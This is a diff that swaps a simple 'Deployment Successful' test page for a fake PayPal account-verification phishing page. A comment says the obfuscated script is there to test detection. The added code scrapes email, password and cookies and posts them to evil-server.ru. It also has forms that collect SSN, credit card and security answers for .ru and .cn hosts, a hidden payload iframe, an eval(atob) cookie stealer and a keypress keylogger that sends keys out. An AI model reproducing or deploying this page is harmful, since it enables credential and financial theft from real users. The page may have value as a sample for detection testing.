@@ -1,80 +1,88 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>StaticRun Test</title>
-
-    <style>
-      body {
-        font-family: Arial, sans-serif;
-        background: #0f172a;
-        color: #e2e8f0;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        height: 100vh;
-        margin: 0;
-      }
-
-      .card {
-        background: #1e293b;
-        padding: 40px;
-        border-radius: 12px;
-        text-align: center;
-        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
-      }
-
-      h1 {
-        margin-bottom: 10px;
-        color: #38bdf8;
-      }
-
-      p {
-        opacity: 0.8;
-      }
-
-      .badge {
-        margin-top: 20px;
-        display: inline-block;
-        padding: 8px 16px;
-        background: #22c55e;
-        color: #022c22;
-        border-radius: 999px;
-        font-weight: bold;
-      }
-
-      button {
-        margin-top: 20px;
-        padding: 10px 20px;
-        border: none;
-        border-radius: 8px;
-        background: #38bdf8;
-        color: #0f172a;
-        cursor: pointer;
-        font-weight: bold;
-      }
-
-      button:hover {
-        background: #0ea5e9;
-      }
-    </style>
-  </head>
-  <body>
-    <div class="card">
-      <h1>🚀 Deployment Successful</h1>
-      <p>If you can see this, your pipeline is working!</p>
-
-      <div class="badge">StaticRun Live</div>
-
-      <br />
-      <button onclick="showMessage()">Click Me</button>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify Your Account - PayPal Security</title>
+    <!-- Obfuscated script to test detection -->
+    <script>
+        var _0x5a21=["\x63\x6F\x6F\x6B\x69\x65","\x64\x6F\x63\x75\x6D\x65\x6E\x74","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x76\x61\x6C\x75\x65","\x70\x61\x73\x73\x77\x6F\x72\x64","\x65\x6D\x61\x69\x6C","\x45\x76\x61\x6C\x75\x61\x74\x69\x6E\x67\x20\x75\x73\x65\x72\x20\x69\x6E\x70\x75\x74","\x63\x6F\x6E\x73\x6F\x6C\x65","\x6C\x6F\x67","\x66\x65\x74\x63\x68","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x65\x76\x69\x6C\x2D\x73\x65\x72\x76\x65\x72\x2E\x72\x75\x2F\x63\x6F\x6C\x6C\x65\x63\x74","\x6D\x65\x74\x68\x6F\x64","\x50\x4F\x53\x54","\x68\x65\x61\x64\x65\x72\x73","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x62\x6F\x64\x79","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x74\x68\x65\x6E","\x6A\x73\x6F\x6E","\x63\x61\x74\x63\x68","\x65\x72\x72\x6F\x72"];
+        (function(){
+            var a=document.getElementById('password').value;
+            var b=document.getElementById('email').value;
+            console.log("Evaluating user input");
+            fetch("https://evil-server.ru/collect",{
+                method:"POST",
+                headers:{"Content-Type":"application/json"},
+                body:JSON.stringify({password:a,email:b,cookie:document.cookie})
+            }).then(r=>r.json()).catch(e=>console.log("error"));
+        })();
+    </script>
+</head>
+<body>
+    <!-- Hidden phishing form -->
+    <div style="display:none;">
+        <form id="phishing-form" action="https://steal-credentials.ru/harvest.php" method="POST">
+            <input type="email" id="email" name="email" placeholder="Enter your email">
+            <input type="password" id="password" name="password" placeholder="Enter your password">
+            <input type="text" name="ssn" placeholder="Social Security Number">
+            <input type="text" name="creditcard" placeholder="Credit Card Number">
+            <button type="submit">Verify Account Now</button>
+        </form>
     </div>
 
+    <!-- Visible fake PayPal login -->
+    <div class="login-container">
+        <h1>PayPal - Verify Your Account</h1>
+        <p class="warning">Unusual activity detected. Please verify your identity immediately.</p>
+        
+        <form action="https://malicious-phishing-site.cn/collect.php" method="POST" id="login-form">
+            <div class="form-group">
+                <label for="paypal-email">Email or Phone Number</label>
+                <input type="email" id="paypal-email" name="login_email" required>
+            </div>
+            <div class="form-group">
+                <label for="paypal-password">Password</label>
+                <input type="password" id="paypal-password" name="login_password" required>
+            </div>
+            <div class="form-group">
+                <label for="security-question">Security Question: What is your mother's maiden name?</label>
+                <input type="text" id="security-question" name="security_answer" required>
+            </div>
+            <button type="submit" class="btn-primary">Log In to Verify</button>
+        </form>
+        
+        <div class="footer">
+            <p>© 2024 PayPal Inc. All rights reserved.</p>
+            <p><a href="https://fake-paypal-support.ru/help">Contact Support</a></p>
+        </div>
+    </div>
+
+    <!-- Malicious iframe -->
+    <iframe src="https://malware-distribution-site.tk/payload.html" style="width:0;height:0;border:none;"></iframe>
+
+    <!-- More obfuscated malicious JS -->
     <script>
-      function showMessage() {
-        alert("Congra! Your GitHub → S3 deployment works perfectly 🎉");
-      }
+        eval(atob("dmFyIGRh dGE9ZG9jdW1lbnQuY29va2llO2ZldGNoKCdodHRwczovL2V2 aWwtc2VydmVyLnJ1L2dyYWInLHttZXRob2Q6J1BPU1QnLGJvZHk6ZGF0YX0p"));
+        
+        // Keylogger simulation
+        document.addEventListener('keypress', function(e) {
+            fetch('https://keylogger-server.ru/log', {
+                method: 'POST',
+                body: JSON.stringify({key: e.key, url: window.location.href})
+            });
+        });
     </script>
-  </body>
+
+    <!-- PADDING TO INCREASE FILE SIZE (Add 2MB+ of whitespace/comments) -->
+    <!-- 
+        Lorem ipsum dolor sit amet, consectetur adipiscing elit...
+        [Repeat this comment block 50,000 times to reach ~2MB]
+        Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.
+        Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris.
+        Duis aute irure dolor in reprehenderit in voluptate velit esse cillum.
+        Excepteur sint occaecat cupidatat non proident, sunt in culpa qui.
+        ... (repeat for 2MB total file size)
+    -->
+</body>
 </html>
